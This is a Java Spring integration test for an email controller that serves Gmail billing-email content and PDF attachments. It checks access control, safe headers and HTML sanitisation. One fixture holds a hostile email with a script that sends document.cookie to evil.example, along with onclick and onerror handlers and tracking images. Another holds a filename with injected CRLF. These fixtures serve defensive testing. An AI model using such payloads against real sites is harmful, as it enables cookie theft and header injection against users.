package com.mirkamolcode.controller;

import com.mirkamolcode.AbstractTestConfig;
import com.mirkamolcode.detection.EmailFixtures;
import com.mirkamolcode.detection.EmailKind;
import com.mirkamolcode.dto.AuthDtos.TokenResponse;
import com.mirkamolcode.entity.BillingEmail;
import com.mirkamolcode.entity.ExchangeRate;
import com.mirkamolcode.entity.GmailConnection;
import com.mirkamolcode.entity.User;
import com.mirkamolcode.integration.gmail.GmailAttachment;
import com.mirkamolcode.integration.gmail.GmailClient;
import com.mirkamolcode.integration.gmail.GmailMessage;
import com.mirkamolcode.integration.google.GoogleOAuthClient;
import com.mirkamolcode.model.CurrencyCode;
import com.mirkamolcode.security.TokenCipher;
import com.mirkamolcode.service.GmailSyncService;
import com.mirkamolcode.service.FakeGmail;
import com.mirkamolcode.service.FakeGoogleOAuth;
import java.io.IOException;
import java.io.InputStream;
import java.math.BigDecimal;
import java.time.Instant;
import java.time.LocalDate;
import java.util.List;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.context.TestConfiguration;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Primary;
import org.springframework.http.HttpHeaders;
import org.springframework.http.MediaType;
import org.springframework.jdbc.core.JdbcTemplate;
import org.springframework.test.web.reactive.server.EntityExchangeResult;

import static org.assertj.core.api.Assertions.assertThat;

class EmailControllerIT extends AbstractTestConfig {
    private static final String STRICT_CSP = "default-src 'none'; img-src data:; style-src 'unsafe-inline'; sandbox";
    private static final String PDF_ID = "att-invoice";
    private static final GmailMessage ADOBE_INVOICE = adobeInvoice("adobe-invoice", PDF_ID, "Invoice_1234567890.pdf");
    private static final FakeGmail GMAIL = new FakeGmail();
    private static final FakeGoogleOAuth GOOGLE = new FakeGoogleOAuth();

    @Autowired
    private GmailSyncService syncService;
    @Autowired
    private TokenCipher tokenCipher;
    @Autowired
    private JdbcTemplate jdbc;

    private TokenResponse tokens;
    private Long userId;

    @TestConfiguration
    static class FakeGoogle {
        @Bean
        @Primary
        GmailClient fakeGmailClient() {
            return GMAIL;
        }

        @Bean
        @Primary
        GoogleOAuthClient fakeGoogleOAuthClient() {
            return GOOGLE;
        }
    }

    @BeforeEach
    void setUp() {
        GMAIL.reset();
        GOOGLE.reset();
        exchangeRateRepository.save(new ExchangeRate(CurrencyCode.USD, new BigDecimal("12850.00"), LocalDate.now()));
        tokens = signIn("alex.doe@gmail.com");
        userId = connectGmail("alex.doe@gmail.com");
    }

    @Test
    void getAttachment_shouldStreamPdfInline_withSafeHeaders() throws IOException {
        // given
        Ids ids = syncInvoice(ADOBE_INVOICE, PDF_ID);

        // when
        EntityExchangeResult<byte[]> result = webTestClient.get()
                .uri(API + "/emails/" + ids.emailId() + "/attachments/" + ids.attachmentId())
                .header("Authorization", bearer(tokens))
                .exchange()
                .expectStatus().isOk()
                .expectBody(byte[].class)
                .returnResult();

        // then
        assertThat(result.getResponseBody()).isEqualTo(samplePdf());
        HttpHeaders headers = result.getResponseHeaders();
        assertThat(headers.getContentType()).isEqualTo(MediaType.APPLICATION_PDF);
        assertThat(headers.getFirst(HttpHeaders.CONTENT_DISPOSITION))
                .isEqualTo("inline; filename=\"Invoice_1234567890.pdf\"; filename*=UTF-8''Invoice_1234567890.pdf");
        assertThat(headers.getCacheControl()).contains("no-store").contains("private");
        assertThat(headers.getFirst("X-Content-Type-Options")).isEqualTo("nosniff");
    }

    @Test
    void getAttachment_shouldOfferDownload_whenRequested() {
        // given
        Ids ids = syncInvoice(ADOBE_INVOICE, PDF_ID);

        // when / then
        webTestClient.get()
                .uri(API + "/emails/" + ids.emailId() + "/attachments/" + ids.attachmentId() + "?download=true")
                .header("Authorization", bearer(tokens))
                .exchange()
                .expectStatus().isOk()
                .expectHeader().value(HttpHeaders.CONTENT_DISPOSITION, value -> assertThat(value).startsWith("attachment;"));
    }

    @Test
    void getAttachment_shouldSendSafeContentDisposition_whenFilenameHasQuotesNewlinesAndNonLatinCharacters() {
        // given
        Ids ids = syncInvoice(adobeInvoice("adobe-cyrillic", "att-cyr", "Hisob \"faktura\"\r\nСчёт.pdf"), "att-cyr");

        // when / then
        webTestClient.get()
                .uri(API + "/emails/" + ids.emailId() + "/attachments/" + ids.attachmentId())
                .header("Authorization", bearer(tokens))
                .exchange()
                .expectStatus().isOk()
                .expectHeader().value(HttpHeaders.CONTENT_DISPOSITION, value -> assertThat(value)
                        .doesNotContain("\r").doesNotContain("\n")
                        .isEqualTo("inline; filename=\"Hisob _faktura_____.pdf\"; "
                                + "filename*=UTF-8''Hisob%20%22faktura%22%D0%A1%D1%87%D1%91%D1%82.pdf"));
    }

    @Test
    void getAttachment_shouldReturnNotFound_whenAttachmentBelongsToAnotherEmail() {
        // given
        Ids first = syncInvoice(ADOBE_INVOICE, PDF_ID);
        Ids second = syncInvoice(adobeInvoice("adobe-second", "att-second", "Invoice_2.pdf"), "att-second");

        // when / then
        expectNotFound("/emails/" + first.emailId() + "/attachments/" + second.attachmentId(), bearer(tokens));
    }

    @Test
    void getAttachment_shouldReturnNotFound_whenAttachmentIsNotPdf() {
        // given
        Ids ids = saveEmailWithAttachment("image/png", 2_000);

        // when / then
        expectNotFound("/emails/" + ids.emailId() + "/attachments/" + ids.attachmentId(), bearer(tokens));
        assertThat(GMAIL.attachmentFetchCount()).isZero();
    }

    @Test
    void getAttachment_shouldRefuseFileAboveSizeLimit_withoutCallingGmail() {
        // given
        Ids ids = saveEmailWithAttachment("application/pdf", 30_000_000);

        // when / then
        webTestClient.get()
                .uri(API + "/emails/" + ids.emailId() + "/attachments/" + ids.attachmentId())
                .header("Authorization", bearer(tokens))
                .exchange()
                .expectStatus().isEqualTo(422)
                .expectBody().jsonPath("$.errorCode").isEqualTo("ATTACHMENT_TOO_LARGE");
        assertThat(GMAIL.attachmentFetchCount()).isZero();
    }

    @Test
    void getAttachment_shouldReturnNotFound_forAnotherUsersEmail() {
        // given
        Ids ids = syncInvoice(ADOBE_INVOICE, PDF_ID);

        // when / then
        expectNotFound("/emails/" + ids.emailId() + "/attachments/" + ids.attachmentId(), bearer(signIn("intruder@example.com")));
        assertThat(GMAIL.attachmentFetchCount()).isZero();
    }

    @Test
    void getAttachment_shouldReturnNotFound_whenMessageWasDeletedInGmail() {
        // given
        Ids ids = syncInvoice(ADOBE_INVOICE, PDF_ID);
        GMAIL.deleteMessage(ADOBE_INVOICE.id());

        // when / then
        webTestClient.get()
                .uri(API + "/emails/" + ids.emailId() + "/attachments/" + ids.attachmentId())
                .header("Authorization", bearer(tokens))
                .exchange()
                .expectStatus().isNotFound()
                .expectBody().jsonPath("$.message").isEqualTo("This email is no longer available in Gmail");
    }

    @Test
    void getAttachment_shouldAskToReconnect_whenGmailAccessWasRevoked() {
        // given
        Ids ids = syncInvoice(ADOBE_INVOICE, PDF_ID);
        GmailConnection connection = gmailConnectionRepository.findByUserId(userId).orElseThrow();
        connection.disconnect();
        gmailConnectionRepository.save(connection);

        // when / then
        webTestClient.get()
                .uri(API + "/emails/" + ids.emailId() + "/attachments/" + ids.attachmentId())
                .header("Authorization", bearer(tokens))
                .exchange()
                .expectStatus().isEqualTo(409)
                .expectBody().jsonPath("$.errorCode").isEqualTo("GMAIL_RECONNECT_REQUIRED");
    }

    @Test
    void getContent_shouldReturnSanitizedDocument_withStrictContentSecurityPolicy() {
        // given
        GmailMessage hostile = new GmailMessage("netflix-hostile", "netflix-hostile", Instant.parse("2026-10-30T09:00:00Z"),
                "Netflix <info@account.netflix.com>", "Your Netflix membership receipt", """
                <html><body>
                <script>fetch('https://evil.example/?c='+document.cookie)</script>
                <p onclick="steal()">Amount charged: $22.99 per month</p>
                <img src="https://tracker.example/open.gif" onerror="steal()">
                <div style="background:url(https://tracker.example/bg.gif);position:fixed">Your next billing date is November 30, 2026.</div>
                </body></html>""", null);
        Long emailId = syncAndFindEmailId(hostile, "netflix");

        // when
        EntityExchangeResult<String> result = webTestClient.get()
                .uri(API + "/emails/" + emailId + "/content")
                .header("Authorization", bearer(tokens))
                .exchange()
                .expectStatus().isOk()
                .expectBody(String.class)
                .returnResult();

        // then
        HttpHeaders headers = result.getResponseHeaders();
        assertThat(headers.getContentType().isCompatibleWith(MediaType.TEXT_HTML)).isTrue();
        assertThat(headers.getFirst("Content-Security-Policy")).isEqualTo(STRICT_CSP);
        assertThat(headers.getFirst("X-Blocked-Remote-Images")).isEqualTo("1");
        assertThat(headers.getFirst("X-Content-Type-Options")).isEqualTo("nosniff");
        assertThat(headers.getFirst("Referrer-Policy")).isEqualTo("no-referrer");
        assertThat(headers.getCacheControl()).contains("no-store");
        assertThat(result.getResponseBody())
                .contains("<meta http-equiv=\"Content-Security-Policy\" content=\"default-src 'none'; img-src data:; style-src 'unsafe-inline'\">")
                .contains("Amount charged: $22.99 per month")
                .doesNotContain("<script").doesNotContain("onclick").doesNotContain("onerror")
                .doesNotContain("tracker.example").doesNotContain("evil.example").doesNotContain("fixed");
    }

    @Test
    void getContent_shouldKeepHttpsImages_andWidenPolicy_whenUserOptsIn() {
        // given
        GmailMessage withLogo = new GmailMessage("netflix-logo", "netflix-logo", Instant.parse("2026-10-30T09:00:00Z"),
                "Netflix <info@account.netflix.com>", "Your Netflix membership receipt",
                "<p>Amount charged: $22.99 per month</p><img src=\"https://assets.nflxext.com/logo.png\">", null);
        Long emailId = syncAndFindEmailId(withLogo, "netflix");

        // when / then
        webTestClient.get()
                .uri(API + "/emails/" + emailId + "/content?images=true")
                .header("Authorization", bearer(tokens))
                .exchange()
                .expectStatus().isOk()
                .expectHeader().valueEquals("Content-Security-Policy",
                        "default-src 'none'; img-src data: https:; style-src 'unsafe-inline'; sandbox")
                .expectHeader().valueEquals("X-Blocked-Remote-Images", "0")
                .expectBody(String.class).value(body -> assertThat(body).contains("https://assets.nflxext.com/logo.png"));
    }

    @Test
    void getContent_shouldEscapePlainTextEmail() {
        // given
        Long emailId = syncAndFindEmailId(new GmailMessage("netflix-text", "netflix-text", Instant.parse("2026-10-30T09:00:00Z"),
                "Netflix <info@account.netflix.com>", "Your Netflix membership receipt", null,
                "Amount charged: $22.99 per month <b>not bold</b>"), "netflix");

        // when / then
        webTestClient.get()
                .uri(API + "/emails/" + emailId + "/content")
                .header("Authorization", bearer(tokens))
                .exchange()
                .expectStatus().isOk()
                .expectBody(String.class).value(body -> assertThat(body)
                        .contains("&lt;b&gt;not bold&lt;/b&gt;")
                        .doesNotContain("<b>not bold</b>"));
    }

    @Test
    void getContent_shouldReturnNotFound_whenEmailIsIrrelevant() {
        // given
        GMAIL.mailbox(EmailFixtures.load("shop-newsletter-save-money.json"));
        syncService.sync(userId);
        Long irrelevantId = billingEmailRepository.findAll().stream()
                .filter(email -> email.getKind() == EmailKind.IRRELEVANT)
                .findFirst().orElseThrow().getId();

        // when / then
        expectNotFound("/emails/" + irrelevantId + "/content", bearer(tokens));
    }

    @Test
    void getContent_shouldReturnNotFound_forAnotherUsersEmail() {
        // given
        Long invoiceId = syncInvoice(ADOBE_INVOICE, PDF_ID).emailId();

        // when / then
        expectNotFound("/emails/" + invoiceId + "/content", bearer(signIn("intruder@example.com")));
    }

    @Test
    void getAttachment_shouldReturnNotFound_evenForAdminReadingAnotherUsersEmail() {
        // given
        Ids ids = syncInvoice(ADOBE_INVOICE, PDF_ID);

        // when / then
        expectNotFound("/emails/" + ids.emailId() + "/attachments/" + ids.attachmentId(), bearer(signInAsAdmin("admin@example.com")));
        assertThat(GMAIL.attachmentFetchCount()).isZero();
    }

    private Ids syncInvoice(GmailMessage invoice, String gmailAttachmentId) {
        try {
            GMAIL.storeAttachment(invoice.id(), gmailAttachmentId, samplePdf());
        } catch (IOException e) {
            throw new IllegalStateException(e);
        }
        Long emailId = syncAndFindEmailId(invoice, "adobe");
        Long subscriptionId = subscriptionRepository.findByUserIdAndMerchantKeyAndIsDeletedFalse(userId, "adobe").orElseThrow().getId();
        Integer attachmentId = webTestClient.get().uri(API + "/subscriptions/" + subscriptionId + "/emails")
                .header("Authorization", bearer(tokens))
                .exchange()
                .expectStatus().isOk()
                .expectBody(new org.springframework.core.ParameterizedTypeReference<List<java.util.Map<String, Object>>>() {
                })
                .returnResult().getResponseBody().stream()
                .filter(email -> ((Number) email.get("id")).longValue() == emailId)
                .map(email -> (List<?>) email.get("attachments"))
                .map(attachments -> (java.util.Map<?, ?>) attachments.getFirst())
                .map(attachment -> (Integer) attachment.get("id"))
                .findFirst().orElseThrow();
        return new Ids(emailId, attachmentId.longValue());
    }

    private Long syncAndFindEmailId(GmailMessage message, String merchantKey) {
        GMAIL.mailbox(message);
        jdbc.update("update gmail_connections set history_id = null where user_id = ?", userId);
        syncService.sync(userId);
        Long subscriptionId = subscriptionRepository.findByUserIdAndMerchantKeyAndIsDeletedFalse(userId, merchantKey).orElseThrow().getId();
        return billingEmailRepository.findBySubscriptionIdOrderByReceivedAtDesc(subscriptionId).stream()
                .filter(email -> email.getGmailMessageId().equals(message.id()))
                .findFirst().orElseThrow().getId();
    }

    private Ids saveEmailWithAttachment(String mimeType, long sizeBytes) {
        User user = userRepository.findById(userId).orElseThrow();
        BillingEmail email = BillingEmail.relevant(user, "manual-" + mimeType.hashCode() + sizeBytes, null, EmailKind.RECEIPT,
                "Adobe <message@adobe.com>", "Your Adobe invoice is ready", Instant.parse("2026-10-12T14:30:00Z"), null, "adobe", null);
        email.addAttachment("att-manual", "Invoice.pdf", mimeType, sizeBytes);
        BillingEmail saved = billingEmailRepository.save(email);
        return new Ids(saved.getId(), saved.getAttachments().getFirst().getId());
    }

    private Long connectGmail(String email) {
        User user = userRepository.findByEmailIgnoreCase(email).orElseThrow();
        gmailConnectionRepository.save(new GmailConnection(user, email, tokenCipher.encrypt("1//refresh"), "gmail.readonly gmail.send"));
        return user.getId();
    }

    private void expectNotFound(String path, String authorization) {
        webTestClient.get().uri(API + path).header("Authorization", authorization).exchange().expectStatus().isNotFound();
    }

    private static GmailMessage adobeInvoice(String id, String attachmentId, String filename) {
        return new GmailMessage(id, id, Instant.parse("2026-10-12T14:30:00Z"), "Adobe <message@adobe.com>",
                "Your Adobe invoice is ready", null, "Plan: Creative Cloud All Apps (billed monthly)\nTotal US$59.99",
                List.of(new GmailAttachment(attachmentId, filename, "application/pdf", 395)));
    }

    private static byte[] samplePdf() throws IOException {
        try (InputStream in = EmailControllerIT.class.getResourceAsStream("/google/invoice-sample.pdf")) {
            return in.readAllBytes();
        }
    }

    private record Ids(Long emailId, Long attachmentId) {
    }
}
